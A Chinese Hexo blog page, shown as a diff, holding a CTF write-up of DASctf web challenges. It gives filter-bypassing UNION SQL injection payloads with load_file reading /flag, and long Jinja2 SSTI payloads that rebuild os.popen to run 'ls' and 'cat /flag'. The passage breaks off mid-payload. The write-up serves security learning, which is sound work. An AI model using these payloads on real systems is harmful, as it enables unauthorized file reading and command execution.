@@ -1,0 +1,1373 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+    <!-- title -->
+
+
+
+
+<!-- keywords -->
+
+
+
+
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no" >
+    <meta name="author" content="JOe KKK">
+    <meta name="renderer" content="webkit">
+    <meta name="copyright" content="JOe KKK">
+    
+    <meta name="keywords" content="hexo,hexo-theme,hexo-blog">
+    
+    <meta name="description" content="">
+    <meta name="description" content="DASctf-web 复现 太菜了呀，又是凑数的一天参考https:&#x2F;&#x2F;shimo.im&#x2F;docs&#x2F;lf9OcEmdH70MC17f&#x2F;read  1.BestDB8考点：联合查询+load_file 文件读取  上来就给了 SQL 语句 PHPF12 源码注释中显示$sql &#x3D; &quot;SELECT * FROM users WHERE id &#x3D; &#39;$query&#39; OR use">
+<meta property="og:type" content="article">
+<meta property="og:title" content="DASctf-web 复现">
+<meta property="og:url" content="http://example.com/2021/04/06/CTF%E6%AF%94%E8%B5%9B/DASctf/index.html">
+<meta property="og:site_name" content="MA4OUT7">
+<meta property="og:description" content="DASctf-web 复现 太菜了呀，又是凑数的一天参考https:&#x2F;&#x2F;shimo.im&#x2F;docs&#x2F;lf9OcEmdH70MC17f&#x2F;read  1.BestDB8考点：联合查询+load_file 文件读取  上来就给了 SQL 语句 PHPF12 源码注释中显示$sql &#x3D; &quot;SELECT * FROM users WHERE id &#x3D; &#39;$query&#39; OR use">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/2021/04/06/CTF%E6%AF%94%E8%B5%9B/DASctf/1.jpg">
+<meta property="og:image" content="http://example.com/2021/04/06/CTF%E6%AF%94%E8%B5%9B/DASctf/1-2.jpg">
+<meta property="og:image" content="http://example.com/2021/04/06/CTF%E6%AF%94%E8%B5%9B/DASctf/2-1.jpg">
+<meta property="og:image" content="http://example.com/2021/04/06/CTF%E6%AF%94%E8%B5%9B/DASctf/2-2.jpg">
+<meta property="og:image" content="http://example.com/2021/04/06/CTF%E6%AF%94%E8%B5%9B/DASctf/2-3.jpg">
+<meta property="og:image" content="http://example.com/2021/04/06/CTF%E6%AF%94%E8%B5%9B/DASctf/3-1.jpg">
+<meta property="article:published_time" content="2021-04-06T14:06:06.000Z">
+<meta property="article:modified_time" content="2021-04-09T01:35:30.341Z">
+<meta property="article:author" content="JOe KKK">
+<meta property="article:tag" content="CTF比赛">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/2021/04/06/CTF%E6%AF%94%E8%B5%9B/DASctf/1.jpg">
+    <meta http-equiv="Cache-control" content="no-cache">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"/>
+    
+    <title>DASctf-web 复现 · Ma4out7&#39;s Blog</title>
+    <style type="text/css">
+    @font-face {
+        font-family: 'Oswald-Regular';
+        src: url("/font/Oswald-Regular.ttf");
+    }
+
+    body {
+        margin: 0;
+    }
+
+    header,
+    footer,
+    .back-top,
+    .sidebar,
+    .container,
+    .site-intro-meta,
+    .toc-wrapper {
+        display: none;
+    }
+
+    .site-intro {
+        position: relative;
+        z-index: 3;
+        width: 100%;
+        /* height: 50vh; */
+        overflow: hidden;
+    }
+
+    .site-intro-placeholder {
+        position: absolute;
+        z-index: -2;
+        top: 0;
+        left: 0;
+        width: calc(100% + 300px);
+        height: 100%;
+        background: repeating-linear-gradient(-45deg, #444 0, #444 80px, #333 80px, #333 160px);
+        background-position: center center;
+        transform: translate3d(-226px, 0, 0);
+        animation: gradient-move 2.5s ease-out 0s infinite;
+    }
+
+    @keyframes gradient-move {
+        0% {
+            transform: translate3d(-226px, 0, 0);
+        }
+        100% {
+            transform: translate3d(0, 0, 0);
+        }
+    }
+
+</style>
+
+    <link rel="preload" href= "/css/style.css?v=20180824" as="style" onload="this.onload=null;this.rel='stylesheet'" />
+    <link rel="stylesheet" href= "/css/mobile.css?v=20180824" media="(max-width: 980px)">
+    
+    <link rel="preload" href="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.2.5/jquery.fancybox.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'" />
+    
+    <!-- /*! loadCSS. [c]2017 Filament Group, Inc. MIT License */
+/* This file is meant as a standalone workflow for
+- testing support for link[rel=preload]
+- enabling async CSS loading in browsers that do not support rel=preload
+- applying rel preload css once loaded, whether supported or not.
+*/ -->
+<script>
+(function( w ){
+	"use strict";
+	// rel=preload support test
+	if( !w.loadCSS ){
+		w.loadCSS = function(){};
+	}
+	// define on the loadCSS obj
+	var rp = loadCSS.relpreload = {};
+	// rel=preload feature support test
+	// runs once and returns a function for compat purposes
+	rp.support = (function(){
+		var ret;
+		try {
+			ret = w.document.createElement( "link" ).relList.supports( "preload" );
+		} catch (e) {
+			ret = false;
+		}
+		return function(){
+			return ret;
+		};
+	})();
+
+	// if preload isn't supported, get an asynchronous load by using a non-matching media attribute
+	// then change that media back to its intended value on load
+	rp.bindMediaToggle = function( link ){
+		// remember existing media attr for ultimate state, or default to 'all'
+		var finalMedia = link.media || "all";
+
+		function enableStylesheet(){
+			link.media = finalMedia;
+		}
+
+		// bind load handlers to enable media
+		if( link.addEventListener ){
+			link.addEventListener( "load", enableStylesheet );
+		} else if( link.attachEvent ){
+			link.attachEvent( "onload", enableStylesheet );
+		}
+
+		// Set rel and non-applicable media type to start an async request
+		// note: timeout allows this to happen async to let rendering continue in IE
+		setTimeout(function(){
+			link.rel = "stylesheet";
+			link.media = "only x";
+		});
+		// also enable media after 3 seconds,
+		// which will catch very old browsers (android 2.x, old firefox) that don't support onload on link
+		setTimeout( enableStylesheet, 3000 );
+	};
+
+	// loop through link elements in DOM
+	rp.poly = function(){
+		// double check this to prevent external calls from running
+		if( rp.support() ){
+			return;
+		}
+		var links = w.document.getElementsByTagName( "link" );
+		for( var i = 0; i < links.length; i++ ){
+			var link = links[ i ];
+			// qualify links to those with rel=preload and as=style attrs
+			if( link.rel === "preload" && link.getAttribute( "as" ) === "style" && !link.getAttribute( "data-loadcss" ) ){
+				// prevent rerunning on link
+				link.setAttribute( "data-loadcss", true );
+				// bind listeners to toggle media back
+				rp.bindMediaToggle( link );
+			}
+		}
+	};
+
+	// if unsupported, run the polyfill
+	if( !rp.support() ){
+		// run once at least
+		rp.poly();
+
+		// rerun poly on an interval until onload
+		var run = w.setInterval( rp.poly, 500 );
+		if( w.addEventListener ){
+			w.addEventListener( "load", function(){
+				rp.poly();
+				w.clearInterval( run );
+			} );
+		} else if( w.attachEvent ){
+			w.attachEvent( "onload", function(){
+				rp.poly();
+				w.clearInterval( run );
+			} );
+		}
+	}
+
+
+	// commonjs
+	if( typeof exports !== "undefined" ){
+		exports.loadCSS = loadCSS;
+	}
+	else {
+		w.loadCSS = loadCSS;
+	}
+}( typeof global !== "undefined" ? global : this ) );
+</script>
+
+    <link rel="icon" href= "/assets/favicon.ico" />
+    <link rel="preload" href="https://cdn.jsdelivr.net/npm/webfontloader@1.6.28/webfontloader.min.js" as="script" />
+    <link rel="preload" href="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js" as="script" />
+    <link rel="preload" href="/scripts/main.js" as="script" />
+    <link rel="preload" as="font" href="/font/Oswald-Regular.ttf" crossorigin>
+    <link rel="preload" as="font" href="https://at.alicdn.com/t/font_327081_1dta1rlogw17zaor.woff" crossorigin>
+    
+    <!-- fancybox -->
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.2.5/jquery.fancybox.min.js" defer></script>
+    <!-- 百度统计  -->
+    
+    <!-- 谷歌统计  -->
+    
+<meta name="generator" content="Hexo 5.2.0"></head>
+
+    
+        <body class="post-body">
+    
+    
+<header class="header">
+
+    <div class="read-progress"></div>
+    <div class="header-sidebar-menu">&#xe775;</div>
+    <!-- post页的toggle banner  -->
+    
+    <div class="banner">
+            <div class="blog-title">
+                <a href="/" >Ma4out7&#39;s Blog</a>
+            </div>
+            <div class="post-title">
+                <a href="#" class="post-name">DASctf-web 复现</a>
+            </div>
+    </div>
+    
+    <a class="home-link" href=/>Ma4out7's Blog</a>
+</header>
+    <div class="wrapper">
+        <div class="site-intro" style="
+
+
+
+
+
+
+
+height:50vh;
+">
+    
+    <!-- 主页  -->
+    
+    
+    <!-- 404页  -->
+            
+    <div class="site-intro-placeholder"></div>
+    <div class="site-intro-img" style="background-image: url(/intro/post-bg.jpg)"></div>
+    <div class="site-intro-meta">
+        <!-- 标题  -->
+        <h1 class="intro-title">
+            <!-- 主页  -->
+            
+            DASctf-web 复现
+            <!-- 404 -->
+            
+        </h1>
+        <!-- 副标题 -->
+        <p class="intro-subtitle">
+            <!-- 主页副标题  -->
+            
+            
+            <!-- 404 -->
+            
+        </p>
+        <!-- 文章页meta -->
+        
+            <div class="post-intros">
+                <!-- 文章页标签  -->
+                
+                    <div class= post-intro-tags >
+    
+        <a class="post-tag" href="javascript:void(0);" data-tags = "CTF比赛">CTF比赛</a>
+    
+</div>
+                
+                
+                    <div class="post-intro-read">
+                        <span>字数统计: <span class="post-count word-count">3.1k</span>阅读时长: <span class="post-count reading-time">17 min</span></span>
+                    </div>
+                
+                <div class="post-intro-meta">
+                    <span class="post-intro-calander iconfont-archer">&#xe676;</span>
+                    <span class="post-intro-time">2021/04/06</span>
+                    
+                    <span id="busuanzi_container_page_pv" class="busuanzi-pv">
+                        <span class="iconfont-archer">&#xe602;</span>
+                        <span id="busuanzi_value_page_pv"></span>
+                    </span>
+                    
+                    <span class="shareWrapper">
+                        <span class="iconfont-archer shareIcon">&#xe71d;</span>
+                        <span class="shareText">Share</span>
+                        <ul class="shareList">
+                            <li class="iconfont-archer share-qr" data-type="qr">&#xe75b;
+                                <div class="share-qrcode"></div>
+                            </li>
+                            <li class="iconfont-archer" data-type="weibo">&#xe619;</li>
+                            <li class="iconfont-archer" data-type="qzone">&#xe62e;</li>
+                            <li class="iconfont-archer" data-type="twitter">&#xe634;</li>
+                            <li class="iconfont-archer" data-type="facebook">&#xe67a;</li>
+                        </ul>
+                    </span>
+                </div>
+            </div>
+        
+    </div>
+</div>
+        <script>
+ 
+  // get user agent
+  var browser = {
+    versions: function () {
+      var u = window.navigator.userAgent;
+      return {
+        userAgent: u,
+        trident: u.indexOf('Trident') > -1, //IE内核
+        presto: u.indexOf('Presto') > -1, //opera内核
+        webKit: u.indexOf('AppleWebKit') > -1, //苹果、谷歌内核
+        gecko: u.indexOf('Gecko') > -1 && u.indexOf('KHTML') == -1, //火狐内核
+        mobile: !!u.match(/AppleWebKit.*Mobile.*/), //是否为移动终端
+        ios: !!u.match(/\(i[^;]+;( U;)? CPU.+Mac OS X/), //ios终端
+        android: u.indexOf('Android') > -1 || u.indexOf('Linux') > -1, //android终端或者uc浏览器
+        iPhone: u.indexOf('iPhone') > -1 || u.indexOf('Mac') > -1, //是否为iPhone或者安卓QQ浏览器
+        iPad: u.indexOf('iPad') > -1, //是否为iPad
+        webApp: u.indexOf('Safari') == -1, //是否为web应用程序，没有头部与底部
+        weixin: u.indexOf('MicroMessenger') == -1, //是否为微信浏览器
+        uc: u.indexOf('UCBrowser') > -1 //是否为android下的UC浏览器
+      };
+    }()
+  }
+  console.log("userAgent:" + browser.versions.userAgent);
+
+  // callback
+  function fontLoaded() {
+    console.log('font loaded');
+    if (document.getElementsByClassName('site-intro-meta')) {
+      document.getElementsByClassName('intro-title')[0].classList.add('intro-fade-in');
+      document.getElementsByClassName('intro-subtitle')[0].classList.add('intro-fade-in');
+      var postIntros = document.getElementsByClassName('post-intros')[0]
+      if (postIntros) {
+        postIntros.classList.add('post-fade-in');
+      }
+    }
+  }
+
+  // UC不支持跨域，所以直接显示
+  function asyncCb(){
+    if (browser.versions.uc) {
+      console.log("UCBrowser");
+      fontLoaded();
+    } else {
+      WebFont.load({
+        custom: {
+          families: ['Oswald-Regular']
+        },
+        loading: function () {  //所有字体开始加载
+          // console.log('loading');
+        },
+        active: function () {  //所有字体已渲染
+          fontLoaded();
+        },
+        inactive: function () { //字体预加载失败，无效字体或浏览器不支持加载
+          console.log('inactive: timeout');
+          fontLoaded();
+        },
+        timeout: 5000 // Set the timeout to two seconds
+      });
+    }
+  }
+
+  function asyncErr(){
+    console.warn('script load from CDN failed, will load local script')
+  }
+
+  // load webfont-loader async, and add callback function
+  function async(u, cb, err) {
+    var d = document, t = 'script',
+      o = d.createElement(t),
+      s = d.getElementsByTagName(t)[0];
+    o.src = u;
+    if (cb) { o.addEventListener('load', function (e) { cb(null, e); }, false); }
+    if (err) { o.addEventListener('error', function (e) { err(null, e); }, false); }
+    s.parentNode.insertBefore(o, s);
+  }
+
+  var asyncLoadWithFallBack = function(arr, success, reject) {
+      var currReject = function(){
+        reject()
+        arr.shift()
+        if(arr.length)
+          async(arr[0], success, currReject)
+        }
+
+      async(arr[0], success, currReject)
+  }
+
+  asyncLoadWithFallBack([
+    "https://cdn.jsdelivr.net/npm/webfontloader@1.6.28/webfontloader.min.js", 
+    "https://cdn.bootcss.com/webfont/1.6.28/webfontloader.js",
+    "/lib/webfontloader.min.js"
+  ], asyncCb, asyncErr)
+</script>        
+        <img class="loading" src="/assets/loading.svg" style="display: block; margin: 6rem auto 0 auto; width: 6rem; height: 6rem;" />
+        <div class="container container-unloaded">
+            <main class="main post-page">
+    <article class="article-entry">
+        <h2 id="DASctf-web-复现"><a href="#DASctf-web-复现" class="headerlink" title="DASctf-web 复现"></a>DASctf-web 复现</h2><ul>
+<li>太菜了呀，又是凑数的一天<br>参考<a target="_blank" rel="noopener" href="https://shimo.im/docs/lf9OcEmdH70MC17f/read">https://shimo.im/docs/lf9OcEmdH70MC17f/read</a></li>
+</ul>
+<h3 id="1-BestDB8"><a href="#1-BestDB8" class="headerlink" title="1.BestDB8"></a>1.BestDB8</h3><p>考点：联合查询+load_file 文件读取</p>
+<ul>
+<li>上来就给了 SQL 语句 PHPF12 源码注释中显示<br><code>$sql = &quot;SELECT * FROM users WHERE id = &#39;$query&#39; OR username = \\&quot;$query\\&quot;&quot;;</code></li>
+<li><code>query=1</code>和<code>query=2</code>均有回显，但是对于单引号进行了过滤，但是它给了 username，通过 username 发现双引号是没有被过滤的，<br>接着测试发现还过滤空格，payload</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">查表</span><br><span class="line">lisi&quot;&#x2F;**&#x2F;union&#x2F;**&#x2F;select&#x2F;**&#x2F;group_concat(table_name),2,3&#x2F;**&#x2F;from&#x2F;**&#x2F;information_schema.tables&#x2F;**&#x2F;where&#x2F;**&#x2F;table_schema&#x3D;database()# </span><br><span class="line">查列</span><br><span class="line">lisi&quot;&#x2F;**&#x2F;union&#x2F;**&#x2F;select&#x2F;**&#x2F;group_concat(column_name),2,3&#x2F;**&#x2F;from&#x2F;**&#x2F;information_schema.columns&#x2F;**&#x2F;where&#x2F;**&#x2F;table_name&#x3D;&quot;f1agdas&quot;&#x2F;**&#x2F;and&#x2F;**&#x2F;table_schema&#x3D;database()# </span><br><span class="line">查数据</span><br><span class="line">lisi&quot;&#x2F;**&#x2F;union&#x2F;**&#x2F;select&#x2F;**&#x2F;group_concat(f1agdas),2,3&#x2F;**&#x2F;from&#x2F;**&#x2F;f1agdas#</span><br><span class="line"></span><br><span class="line">回显了一个flag.txt，应该是要去读数据了这里使用load_file()函数</span><br><span class="line">lisi&quot;&#x2F;**&#x2F;union&#x2F;**&#x2F;select&#x2F;**&#x2F;(select&#x2F;**&#x2F;load_file(0x2f666c6167)),2,3#</span><br></pre></td></tr></table></figure>
+
+<p>这里读的文件是/flag，我也不知道为啥数据库要写 flag.txt，这里对”/“也进行了过滤，可以用十六进制或者 CHAR()绕过</p>
+<ul>
+<li>可惜了，做题时没想到通过 username 的双引号闭合来注入,username 变量</li>
+</ul>
+<ul>
+<li>复现中出现的问题<br>以上 payload 如果直接在 hackerbar 或者 bp 中使用，不会返回结果，需要 URL 编码后的 payload 才可以的得到正确回显<br><img src="/2021/04/06/CTF%E6%AF%94%E8%B5%9B/DASctf/1.jpg"><br><img src="/2021/04/06/CTF%E6%AF%94%E8%B5%9B/DASctf/1-2.jpg"><br>不知道是不是环境的原因，查看 flag,找不到 flag…<ul>
+<li>昨天没有做出来，现在又可以了<br><code>query=-1%22union/**/select/**/1,load_file(0x2f666c61672e747874),3%23</code></li>
+</ul>
+</li>
+</ul>
+<h3 id="2-baby-flask"><a href="#2-baby-flask" class="headerlink" title="2.baby_flask"></a>2.baby_flask</h3><p><img src="/2021/04/06/CTF%E6%AF%94%E8%B5%9B/DASctf/2-1.jpg"></p>
+<ul>
+<li>黑名单过滤</li>
+</ul>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Hi young boy!<span class="tag">&lt;/<span class="name">br</span>&gt;</span></span><br><span class="line">Do you like ssti?<span class="tag">&lt;/<span class="name">br</span>&gt;</span></span><br><span class="line">blacklist<span class="tag">&lt;/<span class="name">br</span>&gt;</span></span><br><span class="line">&#x27;.&#x27;,&#x27;[&#x27;,&#x27;\&#x27;&#x27;,&#x27;&quot;&#x27;,&#x27;&#x27;\\&#x27;,&#x27;+&#x27;,&#x27;:&#x27;,&#x27;_&#x27;,<span class="tag">&lt;/<span class="name">br</span>&gt;</span></span><br><span class="line">&#x27;chr&#x27;,&#x27;pop&#x27;,&#x27;class&#x27;,&#x27;base&#x27;,&#x27;mro&#x27;,&#x27;init&#x27;,&#x27;globals&#x27;,&#x27;get&#x27;,<span class="tag">&lt;/<span class="name">br</span>&gt;</span></span><br><span class="line">&#x27;eval&#x27;,&#x27;exec&#x27;,&#x27;os&#x27;,&#x27;popen&#x27;,&#x27;open&#x27;,&#x27;read&#x27;,<span class="tag">&lt;/<span class="name">br</span>&gt;</span></span><br><span class="line">&#x27;select&#x27;,&#x27;url_for&#x27;,&#x27;get_flashed_messages&#x27;,&#x27;config&#x27;,&#x27;request&#x27;,<span class="tag">&lt;/<span class="name">br</span>&gt;</span></span><br><span class="line">&#x27;count&#x27;,&#x27;length&#x27;,&#x27;０&#x27;,&#x27;１&#x27;,&#x27;２&#x27;,&#x27;３&#x27;,&#x27;４&#x27;,&#x27;５&#x27;,&#x27;６&#x27;,&#x27;７&#x27;,&#x27;８&#x27;,&#x27;９&#x27;,&#x27;0&#x27;,&#x27;1&#x27;,&#x27;2&#x27;,&#x27;3&#x27;,&#x27;4&#x27;,&#x27;5&#x27;,&#x27;6&#x27;,&#x27;7&#x27;,&#x27;8&#x27;,&#x27;9&#x27;<span class="tag">&lt;/<span class="name">br</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">br</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>考点:</p>
+<ul>
+<li>在于对数字过滤后，对于一些关键词的拼凑，不过这里我是以 unicode 编码绕过了，知识点：python3 支持 unicode 编码，所以可以使用”𝟘-𝟡”替换数字，测试的使用<code>&#123;%print 𝟡%&#125;</code>如果可以正常回显就代表支持，<br><img src="/2021/04/06/CTF%E6%AF%94%E8%B5%9B/DASctf/2-2.jpg"></li>
+<li>过滤了点和中括号这样的，但是没过滤掉|attr，因此拿 attr 来绕即可。类似于 globals 的，利用 flask 中的 join 过滤器同样可以拼接出：<br><code>&#123;% set gl=dict(glo=a,bals=a)|join%&#125;</code></li>
+<li>这里放各位师傅的 payload</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line">不知名师傅</span><br><span class="line">&#123;%set a&#x3D;dict(po&#x3D;aa,p&#x3D;aa)|join%&#125; # pop</span><br><span class="line">&#123;%set b&#x3D;lipsum|string|list|attr(a)(𝟙𝟠)%&#125; # _</span><br><span class="line">&#123;%set c&#x3D;(b,b,dict(glob&#x3D;cc,als&#x3D;aa)|join,b,b)|join%&#125; # globals</span><br><span class="line">&#123;%set d&#x3D;(b,b,dict(ge&#x3D;cc,tit&#x3D;dd,em&#x3D;aa)|join,b,b)|join%&#125; # getitem</span><br><span class="line">&#123;%set e&#x3D;dict(o&#x3D;cc,s&#x3D;aa)|join%&#125; # os</span><br><span class="line">&#123;%set f&#x3D;lipsum|string|list|attr(a)(𝟡)%&#125; # 空格</span><br><span class="line">&#123;%set g&#x3D;(((lipsum|attr(c))|attr(d)(e))|string|list)|attr(a)(-𝟠)%&#125; # 斜杠</span><br><span class="line">&#123;%set i&#x3D;(dict(cat&#x3D;aa)|join,f,g,dict(flag&#x3D;aa)|join)|join%&#125; # cat &#x2F;flag</span><br><span class="line">&#123;%set h&#x3D;(a,dict(en&#x3D;aa)|join|join)|join%&#125; # popen</span><br><span class="line">&#123;%set i&#x3D;dict(re&#x3D;aa,ad&#x3D;aa)|join%&#125; # read</span><br><span class="line">&#123;%set z&#x3D;(((lipsum|attr(c))|attr(d)(e))|string|list)|attr(a)(-𝟝)%&#125; #点</span><br><span class="line">&#123;%set j&#x3D;(dict(ls&#x3D;aa)|join,f,g,(dict(var&#x3D;aa)|join),g,(dict(www&#x3D;aa)|join),g,(dict(flask&#x3D;aa)|join)|join)|join%&#125; #ls &#x2F;var&#x2F;www&#x2F;flask</span><br><span class="line">&#123;%print (((lipsum|attr(c))|attr(d)(e))|attr(h)(j))|attr(i)()%&#125;&#123;&#123;j&#125;&#125;</span><br><span class="line">#最后拼接起来</span><br><span class="line">#&#123;&#123;lipsum.__globals__[&#39;os&#39;].popen(&#39;ls &#x2F;var&#x2F;www&#x2F;flask&#39;).read()&#125;&#125;</span><br><span class="line">最后的payload如下，成功执行ls &#x2F;var&#x2F;www&#x2F;flask就可以看到flag了</span><br><span class="line">name&#x3D;&#123;%set a&#x3D;dict(po&#x3D;aa,p&#x3D;aa)|join%&#125;&#123;%set b&#x3D;lipsum|string|list|attr(a)(𝟙𝟠)%&#125;&#123;%set c&#x3D;(b,b,dict(glob&#x3D;cc,als&#x3D;aa)|join,b,b)|join%&#125;&#123;%set d&#x3D;(b,b,dict(ge&#x3D;cc,tit&#x3D;dd,em&#x3D;aa)|join,b,b)|join%&#125;&#123;%set e&#x3D;dict(o&#x3D;cc,s&#x3D;aa)|join%&#125;&#123;%set f&#x3D;lipsum|string|list|attr(a)(𝟡)%&#125;&#123;%set g&#x3D;(((lipsum|attr(c))|attr(d)(e))|string|list)|attr(a)(-𝟠)%&#125;&#123;%set i&#x3D;(dict(cat&#x3D;aa)|join,f,g,dict(flag&#x3D;aa)|join)|join%&#125;&#123;%set h&#x3D;(a,dict(en&#x3D;aa)|join|join)|join%&#125;&#123;%set i&#x3D;dict(re&#x3D;aa,ad&#x3D;aa)|join%&#125;&#123;%set z&#x3D;(((lipsum|attr(c))|attr(d)(e))|string|list)|attr(a)(-𝟝)%&#125;&#123;%set j&#x3D;(dict(ls&#x3D;aa)|join,f,g,(dict(var&#x3D;aa)|join),g,(dict(www&#x3D;aa)|join),g,(dict(flask&#x3D;aa)|join)|join)|join%&#125;&#123;%print (((lipsum|attr(c))|attr(d)(e))|attr(h)(j))|attr(i)()%&#125;&#123;&#123;j&#125;&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">雪殇师傅</span><br><span class="line">&#123;% set dot &#x3D; g|lower|list|sort|join|trim|replace(sq,emp)|list|first %&#125;</span><br><span class="line">&#123;%set gar &#x3D; ()|select|string|lower|unique|list|list|join %&#125;</span><br><span class="line">&#123;%set lt &#x3D; gar|first %&#125;</span><br><span class="line">&#123;%set gw &#x3D; gar|replace(lt, emp)|first %&#125;</span><br><span class="line">&#123;%set e &#x3D; gar|replace(lt, emp)|replace(gw, emp)|first %&#125;&#123;%set n &#x3D; gar|replace(lt, emp)|replace(gw, emp)|replace(e, emp)|first %&#125;&#123;%set r &#x3D; gar|replace(lt, emp)|replace(gw, emp)|replace(e, emp)|replace(n, emp)|first %&#125;</span><br><span class="line">&#123;%set a &#x3D; gar|replace(lt, emp)|replace(gw, emp)|replace(e, emp)|replace(n, emp)|replace(r, emp)|first %&#125;</span><br><span class="line">&#123;%set t &#x3D; gar|replace(lt, emp)|replace(gw, emp)|replace(e, emp)|replace(n, emp)|replace(r, emp)|replace(a, emp)|first %&#125;</span><br><span class="line">&#123;%set o &#x3D; gar|replace(lt, emp)|replace(gw, emp)|replace(e, emp)|replace(n, emp)|replace(r, emp)|replace(a, emp)|replace(t, emp)|first %&#125;</span><br><span class="line">&#123;%set nbsp &#x3D; gar|replace(lt, emp)|replace(gw, emp)|replace(e, emp)|replace(n, emp)|replace(r, emp)|replace(a, emp)|replace(t, emp)|replace(o, emp)|first %&#125;</span><br><span class="line">&#123;%set b &#x3D; gar|replace(lt, emp)|replace(gw, emp)|replace(e, emp)|replace(n, emp)|replace(r, emp)|replace(a, emp)|replace(t, emp)|replace(o, emp)|replace(nbsp, emp)|first %&#125;</span><br><span class="line">&#123;%set j &#x3D; gar|replace(lt, emp)|replace(gw, emp)|replace(e, emp)|replace(n, emp)|replace(r, emp)|replace(a, emp)|replace(t, emp)|replace(o, emp)|replace(nbsp, emp)|replace(b, emp)|first %&#125;</span><br><span class="line">&#123;%set c &#x3D; gar|replace(lt, emp)|replace(gw, emp)|replace(e, emp)|replace(n, emp)|replace(r, emp)|replace(a, emp)|replace(t, emp)|replace(o, emp)|replace(nbsp, emp)|replace(b, emp)|replace(j, emp)|first %&#125;</span><br><span class="line">&#123;%set s &#x3D; gar|replace(lt, emp)|replace(gw, emp)|replace(e, emp)|replace(n, emp)|replace(r, emp)|replace(a, emp)|replace(t, emp)|replace(o, emp)|replace(nbsp, emp)|replace(b, emp)|replace(j, emp)|replace(c,emp)|first %&#125;</span><br><span class="line">&#123;%set l &#x3D; gar|replace(lt, emp)|replace(gw, emp)|replace(e, emp)|replace(n, emp)|replace(r, emp)|replace(a, emp)|replace(t, emp)|replace(o, emp)|replace(nbsp, emp)|replace(b, emp)|replace(j, emp)|replace(c,emp)|replace(s,emp)|first %&#125;</span><br><span class="line">&#123;%set un &#x3D; gar|replace(lt, emp)|replace(gw, emp)|replace(e, emp)|replace(n, emp)|replace(r, emp)|replace(a, emp)|replace(t, emp)|replace(o, emp)|replace(nbsp, emp)|replace(b, emp)|replace(j, emp)|replace(c,emp)|replace(s,emp)|replace(l,emp)|first %&#125;</span><br><span class="line">&#123;%set kw&#x3D;dict(warnings&#x3D;a)|join %&#125;&#123;%set cls&#x3D;un~un~c~l~a~s~s~un~un%&#125;&#123;%set bsx&#x3D;dict(ba&#x3D;a,se&#x3D;a)|join%&#125;&#123;%set bs&#x3D;un~un~bsx~un~un %&#125;&#123;%set ints&#x3D;dict(in&#x3D;a,t&#x3D;a)|join %&#125;&#123;%set scx&#x3D;dict(sub&#x3D;a,cla&#x3D;a,sses&#x3D;a)|join%&#125;&#123;%set sc&#x3D;un~un~scx~un~un%&#125;&#123;%set name&#x3D; un~un~dict(na&#x3D;na,me&#x3D;me)|join~un~un%&#125;&#123;%set gti &#x3D; un~un~dict(ge&#x3D;a,tite&#x3D;a,m&#x3D;a)|join~un~un%&#125;&#123;%for x in ()|attr(cls)|attr(bs)|attr(sc)()%&#125;&#123;%if kw in x|attr(name) %&#125;&#123;%set sla &#x3D; 